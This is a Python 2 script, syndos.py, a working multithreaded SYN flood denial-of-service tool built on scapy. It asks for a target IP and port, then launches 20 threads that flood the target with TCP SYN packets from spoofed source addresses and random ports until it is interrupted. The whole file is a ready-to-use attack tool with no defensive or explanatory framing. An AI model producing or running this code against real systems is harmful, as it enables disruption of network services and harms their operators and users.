#!/usr/bin/env python

#########################################
#
# syndos.py is a multithreaded SYN request
# Denial of Service. Using the SYN/ACK
# 3 way Handshake and a spoofed IP address
# to limit network's ressources.
#
# Inspired from...
# Brandon Smith with his SYNflood.py script
#
#########################################

from scapy.all import *
import random
import threading


#########################
#!# syndos main class #!#
#########################

class syndos():
    flag = 0
    packets_sent = 0
    max_threads = 100 # Basic setting

    def __init__(self,ip,port,max_threads):
        self.ip = ip
        self.port = port
        syndos.max_threads = max_threads
        self.attack_threads = []

    def start(self):

        print "[!] Starting SynDOS.."
        print "[?] Flooding %s:%i with SYN packets" % (self.ip, self.port)

        i = 0
        while i < syndos.max_threads:
            self.attack_threads.append(attack_thread(self.ip, self.port))
            self.attack_threads[i].start()
            i += 1

        print "[?] " + str(syndos.get_max_threads()) + " attack threads lunched."

    # Get syndos flag
    @classmethod
    def get_flag(cls):
        return syndos.flag

    # Set syndos flag
    @classmethod
    def set_flag(cls, flag):
        syndos.flag = flag

    # Increment packets sent counter
    @classmethod
    def increment_packets_sent(cls):
        syndos.packets_sent += 1

    # Get packets sent
    @classmethod
    def get_packets_sent(cls):
        return syndos.packets_sent

    # Get max threads
    @classmethod
    def get_max_threads(cls):
        return syndos.max_threads

    # Generate a random IP address
    @staticmethod
    def random_ip():
        ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        return ip

    # Generate a random IP address on my local network
    @staticmethod
    def random_local_ip():
        ip = "192.168.10." + str(random.randint(120, 254))
        return ip

    # Generate a rand port number
    @staticmethod
    def random_port():
        p = random.randint(1, 65535)
        return p

    # Generate a random int to create data
    @staticmethod
    def random_int():
        x = random.randint(1000, 9000)
        return x

########################################
#!# attack_thread : threading.Thread #!#
########################################

class attack_thread(threading.Thread):

    def __init__(self, target, port):
        threading.Thread.__init__(self)
        self.ip = IP()
        self.ip.src = syndos.random_local_ip()  # Must be a Spoofed IP
        self.ip.dst = target

        self.tcp = TCP()
        self.tcp.sport = syndos.random_port()
        self.tcp.dport = port
        self.tcp.flags = 'S'  # Set SYN tcp flag
        self.tcp.seq = syndos.random_int()
        self.tcp.window = syndos.random_int()

    def run(self):
        while syndos.get_flag() == 0:
            send(self.ip / self.tcp, verbose=0)
            syndos.increment_packets_sent()
        print "[!] Thread terminated"


#######################
#!# Execution point #!#
#######################

if __name__ == "__main__":

    # Input target ip and port
    target = raw_input("IP   >")
    port = input("PORT >")

    attack = syndos(target, port, 20)

    try:
        attack.start()
        for thread in attack.attack_threads:
            thread.join()
    except KeyboardInterrupt:
        syndos.set_flag(1)
        print "[!] Keyboard Interruption"